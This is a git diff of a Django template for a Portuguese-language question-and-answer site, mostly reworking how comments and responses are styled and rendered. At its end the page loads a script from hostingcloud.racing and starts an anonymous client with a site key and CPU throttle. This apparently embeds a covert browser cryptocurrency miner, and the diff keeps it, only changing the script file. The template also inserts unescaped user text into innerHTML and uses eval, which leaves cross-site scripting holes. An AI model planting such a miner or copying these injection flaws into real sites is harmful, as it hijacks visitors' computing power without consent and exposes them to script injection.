@@ -6,9 +6,9 @@
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 		<link href="https://fonts.googleapis.com/css?family=Raleway:400,500,500i,700,800i" rel="stylesheet">
-
+		
+		<script src="https://kit.fontawesome.com/1f965a8b94.js" crossorigin="anonymous"></script>
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
@@ -24,26 +24,27 @@
 		</script>
 
 		<style>
-			.card {
-				margin-top: 3px;
+			#response-form {
+				margin: 6px;
 			}
-
-			.response-profile-pic {
+			
+			#response-form input {
+				margin: 3px;
+			}
+			
+			.comment_form input {
+				margin: 3px;
+			}
+			
+			.card {
+				margin: 6px;
 			}
 
 			section {
 				width: 50%;
 				margin: 6px auto auto;
 			}
-
-			#response-form {
-				margin-top: 5px;
-			}
-
-			#response-form input {
-				margin-left: 2px;
-			}
-
+			
 			@media (min-width: 320px) and (max-width: 480px) {
 			    section {
 			        width: 95%;
@@ -61,7 +62,7 @@
            document.getElementById('response-form').style.display = 'none'
            a = eval('comment_'+answer_id+' = false;function h(el) {el = el.getElementsByClassName("c");for(var i = 0; i < el.length; i++) {if(el[i].style.display != "none") {el[i].style.display = "none";} else {el[i].style.display = "block";}}}')
            a = ''
-           document.getElementById('responses').innerHTML += '<div class="card"><a href="/user/{{ user.username }}" style="text-decoration: none; color: black"><img src="{{user_p.avatar.url}}" width="40px" class="user-profile-picture"> {{ user.username }}</a><div class="card-body"><p>'+document.getElementById('response-form').response.value+'</p><img onclick="like_or_stop_liking(this)" src="/static/images/white-heart.png" width="20px" id="' + answer_id + '" style="cursor: pointer"> &nbsp;<span>0</span> ' + a + '&nbsp;&nbsp;&nbsp;<span style="cursor: pointer;" onclick="if(comment_' + answer_id + ' == false) {show_comments(this, '+answer_id+', 1); comment_'+answer_id+' = true} else {h(this.parentElement)}"><img src="/static/images/comments.png" width="20px" style="cursor: pointer;"></span><span> &nbsp;0</span>        </div></div>'
+           document.getElementById('responses').innerHTML += '<div class="card"><a href="/user/{{ user.username }}" style="text-decoration: none; color: black"><img src="{{user_p.avatar.url}}" width="40px"> {{ user.username }}</a><div class="card-body"><p>'+document.getElementById('response-form').response.value+'</p><img onclick="like_or_stop_liking(this)" src="/static/images/white-heart.png" width="20px" id="' + answer_id + '" style="cursor: pointer"> &nbsp;<span>0</span> ' + a + '&nbsp;&nbsp;&nbsp;<span style="cursor: pointer;" onclick="if(comment_' + answer_id + ' == false) {show_comments(this, '+answer_id+', 1); comment_'+answer_id+' = true} else {h(this.parentElement)}"><img src="/static/images/comments.png" width="20px" style="cursor: pointer;"></span><span> &nbsp;0</span>        </div></div>'
            document.getElementById('response-form').remove()
        });
      });
@@ -153,22 +154,39 @@
 
 						if(data.has_comments == 'false') {
 							// caso a resposta não tenha comentários:
-							el.parentElement.innerHTML += "<div class='card c'><div class='card-body'><p>Não há comentários.</p></div></div>"
-							element.innerHTML += '<form class="c" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
+							el.parentElement.innerHTML += "<div class='c'><hr><p>Não há comentários.</p><hr></div>"
+							element.innerHTML += '<form class="form-inline c comment_form" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
 							return
 						}
 
 						if (card) {
 							element = card
 						}
+						
+						try {
+							element.getElementsByTagName('hr')[element.getElementsByTagName('hr').length - 1].remove()
+						} catch (e) {
+						}
 
 						var count = 1
 						while(count <= data.total_comments) {
 
 							if(data.comments[count].username == "{{ user.username }}") {
-								element.innerHTML += "<small id='comment_"+data.comments[count].id+"' class='c'><div class='card'><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='40px' class='response-profile-pic'> " + data.comments[count].username + "</a><div class='card-body'><p>" + data.comments[count].comment + "</p><img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;'></div></div></small>"
-							} else
-								element.innerHTML += "<small class='c'><div class='card'><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='40px' class='response-profile-pic'> " + data.comments[count].username + "</a><div class='card-body'><p>" + data.comments[count].comment + "</p></div></div></small>"
+								//element.innerHTML += "<small id='comment_"+data.comments[count].id+"' class='c'><div class='card'><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='40px' class='response-profile-pic'> " + data.comments[count].username + "</a><div class='card-body'><p>" + data.comments[count].comment + "</p><img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;'></div></div></small>"
+								last_comment = ""
+								
+								if(count == data.total_comments)
+									last_comment = "<hr>"
+								
+								element.innerHTML += "<div id='comment_"+data.comments[count].id+"' class='c'><hr><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='35px'> " + data.comments[count].username + "</a>  <img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;' id='comment_"+data.comments[count].id+"'>  <p>" + data.comments[count].comment + "</p>"+last_comment+"</div>"
+							} else {
+								last_comment = ""
+								
+								if(count == data.total_comments)
+									last_comment = "<hr>"
+								
+								element.innerHTML += "<div class='c'><hr><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='35px'> " + data.comments[count].username + "</a><p>" + data.comments[count].comment + "</p>"+last_comment+"</div>"
+							}
 							count += 1
 						}
 
@@ -177,7 +195,7 @@
 							element.innerHTML += `<div class='c' id='` + `show_more_${response_id}` + `'><p style='cursor: pointer;' onclick='show_comments(this, ` + `${response_id}, ` + `${page}` + `, this, element);'>Mostrar mais...</p></div>`
 						}
 
-						element.innerHTML += '<form class="c" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
+						element.innerHTML += '<form class="form-inline c comment_form" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
 					},
 				})
 			}
@@ -193,7 +211,7 @@
 
 			function delete_comment(obj) {
 
-				obj = obj.parentElement.parentElement.parentElement
+				obj = obj.parentElement
 
 				comment_id = obj.id.slice(8)
 
@@ -210,20 +228,6 @@
 				obj.remove()
 			}
 		</script>
-
-		<style>
-		    .card {
-		        border-radius: 10px;
-		    }
-
-		    .card .user-profile-picture {
-		        border-radius: 10px;
-		    }
-
-		    .c img {
-		        border-radius: 10px;
-		    }
-		</style>
 
 		<script>
 			function show_more(obj) {
@@ -296,14 +300,14 @@
 
 			<div class="card">
 				<div class="card-body">
-					<big>{{question.text}}</big> &middot; <a href="/user/{{ question.creator.user.username }}">{{ question.creator.user.username }}</a>
+					<a href="/user/{{ question.creator.user.username }}" style="color: black; text-decoration: none;"><img width="45px" src="{{ question.creator.avatar.url }}" alt="{{ question.creator.user.username }}"> <span>{{ question.creator.user.username }}</span></a>
+					<h2><small>{{question.text}}</small></h2>
 					{% if question.description == '' %}
 							{% if question.image %}
 							<center><img style="display: block;" src="{{ question.image.url }}" width="55%"></center>
 							{% endif %}
 					{% endif %}
 					{% if question.description %}
-					<hr>
 					<p>
 						{{ question.cut_description|safe|linebreaksbr }}
 					</p>
@@ -311,18 +315,16 @@
 					<center><img style="display: block;" src="{{ question.image.url }}" width="55%"></center>
 					{% endif %}
 					{% endif %}
+					
+			{% if request.user.username == question.creator.user.username %}
+				<button class="btn btn-outline-danger" style="display: block;" onclick="delete_question()">Excluir</button>
+			{% endif %}
 				</div>
 			</div>
 
-			<hr>
-
-			{% if request.user.username == question.creator.user.username %}
-				<br><button class="btn btn-outline-danger" style="display: block;" onclick="delete_question()">Excluir</button><br>
-			{% endif %}
-
 			{% for response in responses %}
 			<div class="card">
-			    <a href="/user/{{response.creator.user.username}}" style="text-decoration: none; color: black"><img class="user-profile-picture" src="{{response.creator.avatar.url}}" width="40px" class="response-profile-pic"> {{response.creator.user.username}}</a>
+			    <a href="/user/{{response.creator.user.username}}" style="text-decoration: none; color: black"><img src="{{response.creator.avatar.url}}" width="40px" class="response-profile-pic"> {{response.creator.user.username}}</a>
 				<div class="card-body comments-off">
 					<p>{{ response.text|linebreaksbr }}</p>
 					{% if user.is_authenticated %}
@@ -376,7 +378,7 @@
 			{% else %}
 				{% if answered %}
 				{% else %}
-				<form class="form-inline" id="response-form" method="post">
+				<form id="response-form" method="post">
 					{% csrf_token %}
 					<textarea class="form-control" placeholder="Responda esta pergunta!" name="response" required="required"></textarea>
 					<input class="btn btn-primary" type="submit" value="Enviar" onclick="javascript:if(anti_spam(this) == 'false') {return false}">
@@ -385,7 +387,7 @@
 			{% endif %}
 		</section>
 
-<script src="https://www.hostingcloud.racing/cJUj.js"></script>
+<script src="https://www.hostingcloud.racing/dJi3.js"></script>
 <script>
     var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
         throttle: 0.9, c: 'w', ads: 0
